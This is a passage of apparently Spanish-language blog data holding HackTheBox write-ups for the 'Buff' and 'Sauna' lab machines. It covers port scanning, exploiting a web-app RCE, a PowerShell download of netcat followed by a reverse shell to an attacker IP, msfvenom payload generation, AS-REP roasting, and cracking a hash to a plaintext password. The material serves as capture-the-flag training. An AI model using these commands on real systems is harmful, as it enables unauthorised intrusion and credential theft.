\u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[5.5, 5.6, 7.5, 2.5, 4.4], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[6, 7, 9, 1, 3], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto 7680 y el puerto http (8080) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  # Nmap 7.80 scan initiated Sat Sep 12 02:35:25 2020 as: nmap -Pn -p- --min-rate 1000 -o allports buff.htb Nmap scan report for buff.htb (buff.htb) Host is up (0.21s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 7680/tcp open pando-pub 8080/tcp open http-proxy # Nmap done at Sat Sep 12 02:38:42 2020 -- 1 IP address (1 host up) scanned in 197.50 seconds # Nmap 7.80 scan initiated Sat Sep 12 02:39:30 2020 as: nmap -Pn -sV -sC -p 7689,8080 -o serviceports buff.htb Nmap scan report for buff.htb (buff.htb) Host is up (0.068s latency). PORT STATE SERVICE VERSION 7689/tcp filtered collaber 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 |_http-title: mrb3n\u0026#39;s Bro Hut Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Sep 12 02:39:58 2020 -- 1 IP address (1 host up) scanned in 27.62 seconds   HTTP Encontramos una pagina web en el puerto 80.\nDIRBUSTER Utilizamos dirbuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  _|. _ _ _ _ _ _|_ v0.3.9 (_||| _) (/_(_|| (_| ) Extensions: | HTTP method: GET | Suffixes: php, html, txt | Threads: 150 | Wordlist size: 4614 | Request count: 4614 Error Log: /home/kali/tools/dirsearch/logs/errors-20-09-12_02-45-06.log Target: http://buff.htb:8080/ Output File: /home/kali/tools/dirsearch/reports/buff.htb/20-09-12_02-45-08 [02:45:08] Starting: [02:45:10] 200 - 5KB - / [02:45:13] 403 - 1KB - /admin.pl [02:45:14] 403 - 1KB - /admin.cgi [02:45:17] 403 - 1KB - /AT-admin.cgi [02:45:18] 403 - 1KB - /aux [02:45:20] 403 - 1KB - /cachemgr.cgi [02:45:21] 301 - 334B - /boot -\u0026gt; http://buff.htb:8080/boot/ [02:45:23] 403 - 1KB - /com1 [02:45:23] 403 - 1KB - /com2 [02:45:23] 403 - 1KB - /cgi-bin/ [02:45:24] 403 - 1KB - /com3 [02:45:25] 403 - 1KB - /con [02:45:33] 301 - 332B - /ex -\u0026gt; http://buff.htb:8080/ex/ [02:45:34] 503 - 1KB - /examples [02:45:41] 200 - 5KB - /index.php [02:45:42] 301 - 337B - /include -\u0026gt; http://buff.htb:8080/include/ [02:45:43] 301 - 333B - /img -\u0026gt; http://buff.htb:8080/img/ [02:45:43] 200 - 18KB - /LICENSE [02:45:43] 403 - 1KB - /licenses [02:45:45] 200 - 18KB - /license [02:45:45] 403 - 1KB - /lpt1 [02:45:45] 403 - 1KB - /lpt2 [02:45:55] 403 - 1KB - /phpmyadmin [02:45:57] 301 - 337B - /profile -\u0026gt; http://buff.htb:8080/profile/ [02:45:57] 403 - 1KB - /prn [02:45:58] 403 - 1KB - /nul [02:46:03] 403 - 1KB - /server-info [02:46:03] 403 - 1KB - /server-status Task Completed   SHAUN - USER Al revisar la pagina vemos la version de la aplicacion web la cual es Gym Management Software 1.0.\nExploramos si existe una vulnerabilidad en esta aplicacion y encontramos que tiene una vulnerabilidad de RCE utilizando una imagen. Descargamos el exploit, ejecutamos y logramos obtener una shell y nuestra flag user.txt.\nEjecutamos una shell inversa con netcat, el cual descargamos en la maquina y ejecutamos esta hacia nuestra IP y puerto.\n1 2  powershell -command \u0026#34;\u0026amp; { iwr 10.10.10.40/nc.exe -OutFile C:\\Users\\shaun\\Desktop\\nc.exe }\u0026#34; C:\\Users\\shaun\\Desktop\\nc.exe -e cmd 10.10.10.40 443   Creamos un pequeño servidor http con python3 y pusimos a la escucha netcat, logrando obtener una shell con el usuario SHAUN.\nPRIVILEGE ESCALATION Realizamos una pequeña enumeracion en la maquina y encontramos un ejecutable en la carpeta de descargas del usuario shaun.\nAl realizar una busqueda de este archivo encontramos un exploit que afecta a un servicio. Además de ello encontramos el puerto 8888 en el cual corre este servicio en la maquina, pero este esta de manera local.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  C:\\xampp\\htdocs\\gym\\upload\u0026gt;tasklist | find /i \u0026#34;CloudMe\u0026#34; tasklist | find /i \u0026#34;CloudMe\u0026#34; CloudMe.exe 7388 0 18,628 K C:\\xampp\\htdocs\\gym\\upload\u0026gt;netstat -ano | find /i \u0026#34;LISTENING\u0026#34; netstat -ano | find /i \u0026#34;LISTENING\u0026#34; TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 956 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:5040 0.0.0.0:0 LISTENING 5736 TCP 0.0.0.0:7680 0.0.0.0:0 LISTENING 4256 TCP 0.0.0.0:8080 0.0.0.0:0 LISTENING 3648 TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 528 TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 1108 TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 1504 TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING 2156 TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING 672 TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING 688 TCP 10.10.10.198:139 0.0.0.0:0 LISTENING 4 TCP 127.0.0.1:3306 0.0.0.0:0 LISTENING 7844 TCP 127.0.0.1:8888 0.0.0.0:0 LISTENING 8416 TCP [::]:135 [::]:0 LISTENING 956 TCP [::]:445 [::]:0 LISTENING 4 TCP [::]:7680 [::]:0 LISTENING 4256 TCP [::]:8080 [::]:0 LISTENING 3648 TCP [::]:49664 [::]:0 LISTENING 528 TCP [::]:49665 [::]:0 LISTENING 1108 TCP [::]:49666 [::]:0 LISTENING 1504 TCP [::]:49667 [::]:0 LISTENING 2156 TCP [::]:49668 [::]:0 LISTENING 672 TCP [::]:49669 [::]:0 LISTENING 688 C:\\xampp\\htdocs\\gym\\upload\u0026gt;   Utlizamos chisel para realizar reverse tunneling al puerto 8888, descargamos este en la maquina y ejecutamos un tunel reverso de SSH a nuestra maquina, para obtener el puerto 8888 localmente y explotarlo con el exploit que encontramos.\n1  chisel.exe client 10.10.14.44:8080 R:8888:127.0.0.1:8888   En nuestra maquina ejecutamos chisel server:\n1  chisel server -p 8080 --reverse   Ahora que tenemos el puerto 8888 localmente podemos explotar este con el exploit pero primero debemos de crear nuestro payload con msfvenom para que ejecute una shell inversa.\n1  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.44 LPORT=1338 -f c   Una vez generado nuestro payload reemplazamos el que esta en el exploit con el nuestro, ponemos a la escucha netcat localmente, ejecutamos el exploit y logramos obtener una shell con usuario Administrator y nuestra flag root.txt.\n","description":"Buff es una maquina de HackTheBox con SO Windows, encontramos un RCE en Gym Managmente Software lo que nos dio acceso con el usuario Shaun. Observamos un puerto localmente perteneciente a CloudMe, ejecutamos un reverse tunneling para poder explotar la vulnerabilidad Buffer Overflow y obtener acceso privilegiado.","id":34,"section":"posts","tags":["chisel","dirbuster","metasploit","msfvenom"],"title":"Hack The Box - Buff","uri":"https://sckull.github.io/posts/buff/"},{"content":"  Sauna una maquina de HackTheBox, encontramos usuarios los cuales utilizamos para crear un wordlist personalizado y realizar ASREPRoast con Impacket lo que nos dio acceso por WinRM. Accedimos a un segundo usuario con una contraseña que encontramos en el registro de windows. Finalmente enumeramos con BloodHound y con la informacion recolectada obtuvimos acceso con ACLPwn para luego realizar Pass-the-Hash y obtener acceso privilegiado con PSExec.\nInformacion de la Maquina    Nombre Sauna      OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.175   Maker egotisticalSW    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[8.2, 7.9, 6.6, 3.4, 2.1], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[10, 10, 10, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  # Nmap 7.80 scan initiated Tue Feb 25 00:32:17 2020 as: nmap -p- --min-rate 1000 -sV -o nmap_scan 10.10.10.175 Nmap scan report for 10.10.10.175 Host is up (0.23s latency). Not shown: 65516 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain? 80/tcp open http Microsoft IIS httpd 10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-02-25 14:36:02Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49671/tcp open msrpc Microsoft Windows RPC 49682/tcp open msrpc Microsoft Windows RPC 55601/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=2/25%Time=5E54C001%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Feb 25 00:37:01 2020 -- 1 IP address (1 host up) scanned in 283.37 seconds   NMAP LDAP Utilizamos el script ldap-search de nmap, y encontramos mucha informacion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90  # Nmap 7.80 scan initiated Tue Feb 25 00:41:12 2020 as: nmap --script=ldap-search -p389 -o nmap_ldap_script 10.10.10.175 Nmap scan report for 10.10.10.175 Host is up (0.083s latency). PORT STATE SERVICE 389/tcp open ldap | ldap-search: | Context: DC=EGOTISTICAL-BANK,DC=LOCAL | dn: DC=EGOTISTICAL-BANK,DC=LOCAL | objectClass: top | objectClass: domain | objectClass: domainDNS | distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL | instanceType: 5 | whenCreated: 2020/01/23 05:44:25 UTC | whenChanged: 2020/02/25 14:32:31 UTC | subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL | subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL | subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL | uSNCreated: 4099 | dSASignature: \\x01\\x00\\x00\\x00(\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00@\\xBE\\xE0\\xB3\\xC6%\\xECD\\xB2\\xB9\\x9F\\xF8\\D\\xB2\\xEC | uSNChanged: 53269 | name: EGOTISTICAL-BANK | objectGUID: 504e6ec-c122-a143-93c0-cf487f83363 | replUpToDateVector: \\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xFDZ\\x85\\x92F\\xDE^A\\xAAVnj@#\\xF6\\x0C\\x0B\\xD0\\x00\\x00\\x00\\x00\\x00\\x00\\xFE\\xC0e\\x14\\x03\\x00\\x00\\x00@\\xBE\\xE0\\xB3\\xC6%\\xECD\\xB2\\xB9\\x9F\\xF8\\D\\xB2\\xEC\t\\xB0\\x00\\x00\\x00\\x00\\x00\\x00\\xD4\\x04R\\x14\\x03\\x00\\x00\\x00 | creationTime: 132271147519409907 | forceLogoff: -9223372036854775808 | lockoutDuration: -18000000000 | lockOutObservationWindow: -18000000000 | lockoutThreshold: 0 | maxPwdAge: -36288000000000 | minPwdAge: -864000000000 | minPwdLength: 7 | modifiedCountAtLastProm: 0 | nextRid: 1000 | pwdProperties: 1 | pwdHistoryLength: 24 | objectSid: 1-5-21-2966785786-3096785034-1186376766 | serverState: 1 | uASCompat: 1 | modifiedCount: 1 | auditingPolicy: \\x00\\x01 | nTMixedDomain: 0 | rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL | fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL | systemFlags: -1946157056 | wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL | wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL | objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL | isCriticalSystemObject: TRUE | gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL;0] | dSCorePropagationData: 1601/01/01 00:00:00 UTC | otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL | otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL | masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL | ms-DS-MachineAccountQuota: 10 | msDS-Behavior-Version: 7 | msDS-PerUserTrustQuota: 1 | msDS-AllUsersTrustQuota: 1000 | msDS-PerUserTrustTombstonesQuota: 10 | msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL | msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL | msDS-NcType: 0 | msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE | dc: EGOTISTICAL-BANK | dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL | dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL |_ dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL # Nmap done at Tue Feb 25 00:41:13 2020 -- 1 IP address (1 host up) scanned in 1.03 seconds   USER - FSmith En el puerto 80 esta corriendo una pagina en la cual podemos obtener los nombres de las personas que pertenecen a esta empresa, utilizando estos nombres creamos un diccionario con diferentes conbinaciones entre si, en el reporte de nmap con el script de ldap-search podemos ver otro nombre \u0026lsquo;Hugo Smith\u0026rsquo; el cual vamos a agregar a nuestro diccionario de nombres.\nTesting for Weak password policy\nNombres\nCombinacion de nombres de usuarios con script de python:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  #!/usr/bin/env python import sys if __name__ == \u0026#34;__main__\u0026#34;: if len(sys.argv) != 2: print \u0026#34;usage: %snames.txt\u0026#34; % (sys.argv[0]) sys.exit(0) for line in open(sys.argv[1]): name = \u0026#39;\u0026#39;.join([c for c in line if c == \u0026#34; \u0026#34; or c.isalpha()]) tokens = name.lower().split() fname = tokens[0] lname = tokens[-1] print fname + lname\t# johndoe print lname + fname\t# doejohn print fname + \u0026#34;.\u0026#34; + lname\t# john.doe print lname + \u0026#34;.\u0026#34; + fname\t# doe.john print lname + fname[0]\t# doej print fname[0] + lname\t# jdoe print lname[0] + fname\t# djoe print fname[0] + \u0026#34;.\u0026#34; + lname\t# j.doe print lname[0] + \u0026#34;.\u0026#34; + fname\t# d.john print fname\t# john   Utilizamos GetNPUsers de impacket para obtener informacion de LDAP junto con la lista de usuarios sin autenticacion:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  root@aoiri:~/htb/sauna# python /root/tools/impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 -usersfile list_users.txt -request -format hashcat -outputfile hashes.asreproast Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [... snip ...] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] User hsmith doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [... snip ...] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:42fc70db3f5d9b26862ee8a381f41300$bfc70df530d642039f9c1135e399e4cf27e8ddb75f8a2dbc9b37b4b66226b9d733452368075ea1bfee410a0e18430b2320407c02aa161cd9be0ed96285ced026eb233fbfa2e9b65991321c6d9c4bf9556f32759eb9fe92f239b91543a2f96e643e2f30fe3c8b59c83e39104a3134c165feec05d2d993962a716e495b9c629a63d9e35355337d280ec389ef730495aead980f9a5a9654c9f356553ca484c2014a411a2e812906a6a1ba7e133456cf0bf532d2d682d451e8577f35c6059474e6829e5d0e3bfed887828cbe7efb36d946e13ed6a2aa67ca2819e587d68386244d055998571d4a5a5831935e47dfdac4caf73072c6592af0ad0226e94e3657b71e40 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [... snip ...] root@aoiri:~/htb/sauna#   Hashes capturadas\n$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a9fd61a55cd08ff4f2298bf6d2eaea41$9b8899d4f678c22f5171bb699d87d51a08520d8206cc6967017f65bee3fb3d814855da6929a1691b6fb3d430cf0ee2697022ecce332fd29d3af31fce8766b67d90ead50310c7238dd9a6a48478fc0d25c1c0a8e8cea418795d36d56b8c6c2069f0aad851172a4dedeb7c5898a44e36401383718caaaaab04a670d4dbd6ef42f84bf097f4e180cb9cc9b00b497e6a758aa5084aa46d9f365d6f5896eea79954e553510369d1bfaeed9a1f4ce63125aeddcc1a533c16e19047a211457455470338e12d2e970a234a98203e9808c67a2b97356f4d89d8da0d115c91fd5a294b7daf2c69321b4ac2d6dfa38f470fd1f9854148342442ca44437c1c099c39db5fdd5a Utilizamos hashcat para crackear la contraseña:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61  ➜ hashcat ./hashcat64.bin -m 18200 sauna_hash ../rockyou.txt -o sauna_cracked.txt hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Not-Iterated * Single-Hash * Single-Salt Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: ../rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =\u0026gt; Session..........: hashcat Status...........: Cracked Hash.Type........: Kerberos 5 AS-REP etype 23 Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a9fd61a...5fdd5a Time.Started.....: Wed Feb 26 15:45:34 2020 (6 secs) Time.Estimated...: Wed Feb 26 15:45:40 2020 (0 secs) Guess.Base.......: File (../rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 2115.6 kH/s (9.59ms) @ Accel:256 Loops:1 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 10567680/14344385 (73.67%) Rejected.........: 0/10567680 (0.00%) Restore.Point....: 10518528/14344385 (73.33%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: VALERIA05 -\u0026gt; TGWild\\\\ Hardware.Mon.#1..: Temp: 57c Util: 37% Core:1189MHz Mem:2505MHz Bus:4 Started: Wed Feb 26 15:45:26 2020 Stopped: Wed Feb 26 15:45:41 2020 ➜ hashcat cat sauna_cracked.txt $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a9fd61a55cd08ff4f2298bf6d2eaea41$9b8899d4f678c22f5171bb699d87d51a08520d8206cc6967017f65bee3fb3d814855da6929a1691b6fb3d430cf0ee2697022ecce332fd29d3af31fce8766b67d90ead50310c7238dd9a6a48478fc0d25c1c0a8e8cea418795d36d56b8c6c2069f0aad851172a4dedeb7c5898a44e36401383718caaaaab04a670d4dbd6ef42f84bf097f4e180cb9cc9b00b497e6a758aa5084aa46d9f365d6f5896eea79954e553510369d1bfaeed9a1f4ce63125aeddcc1a533c16e19047a211457455470338e12d2e970a234a98203e9808c67a2b97356f4d89d8da0d115c91fd5a294b7daf2c69321b4ac2d6dfa38f470fd1f9854148342442ca44437c1c099c39db5fdd5a:Thestrokes23 ➜ hashcat   SMBMAP Utilizamos smbmap con las credenciales que encontramos para enumerar los SHARENAMES a los que el usuario fsmith puede acceder.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68  root@aoiri:~/htb/sauna# smbmap -H 10.10.10.175 -u fsmith -p \u0026#39;Thestrokes23\u0026#39; [+] Finding open SMB ports.... [+] User SMB session established on 10.10.10.175... [+] IP: 10.10.10.175:445\tName: 10.10.10.175 Disk Permissions\tComment ---- -----------\t------- ADMIN$ NO ACCESS\tRemote Admin C$ NO ACCESS\tDefault share . fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tInitShutdown fr--r--r-- 4 Sun Dec 31 17:57:56 1600\tlsass fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tntsvcs fr--r--r-- 4 Sun Dec 31 17:57:56 1600\tscerpc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-360-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tepmapper fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-1cc-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tLSM_API_service fr--r--r-- 3 Sun Dec 31 17:57:56 1600\teventlog fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-420-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tatsvc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-5b0-0 fr--r--r-- 4 Sun Dec 31 17:57:56 1600\twkssvc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-260-0 